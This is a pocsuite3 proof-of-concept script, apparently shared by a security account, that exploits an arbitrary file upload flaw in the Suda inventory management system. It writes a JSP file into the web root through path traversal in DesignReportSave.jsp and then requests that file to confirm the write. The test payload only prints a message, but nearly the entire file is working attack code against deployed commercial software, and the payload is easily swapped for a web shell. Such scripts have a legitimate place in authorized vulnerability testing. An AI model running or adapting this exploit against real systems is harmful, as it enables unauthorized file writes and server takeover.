# _*_ coding:utf-8 _*_
# @Time : 2023/12/11 21:01
# @Author: 为赋新词强说愁
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str
import time

class sslvpnclient(POCBase):
    pocDesc = '''速达进存销管理系统任意文件上传漏洞'''
    vulID = '20231211'
    version = '1.0'
    author = '公众号网络安全透视镜'
    vulDate = '2023-12-11'
    createDate = '2023-12-11'
    updateDate = '2023-12-11'
    name = '速达进存销管理系统任意文件上传漏洞'
    appName = '速达进存销管理系统'



    def _verify(self):

        result = {}
        path = '/report/DesignReportSave.jsp?report=../security.jsp'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            "Accept-Encoding": "gzip, deflate",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"

        }
        payload = "/report/DesignReportSave.jsp?report=../security.jsp"
        path2 = '/security.jsp'
        url = self.url + path
        check_url = self.url + path2
        data = """<% out.print("This website has a vulnerability!!!");%>"""
        try:
            respnose1 = requests.post(url, headers=headers, data=data,timeout=4, verify=False)
            time.sleep(3)
            print(respnose1.status_code)
            respnose2 = requests.get(check_url,headers=headers,timeout=3,verify=False)
            print(respnose2.status_code)
            if respnose1.status_code == 200 and respnose2.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['payload'] = payload

            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(sslvpnclient)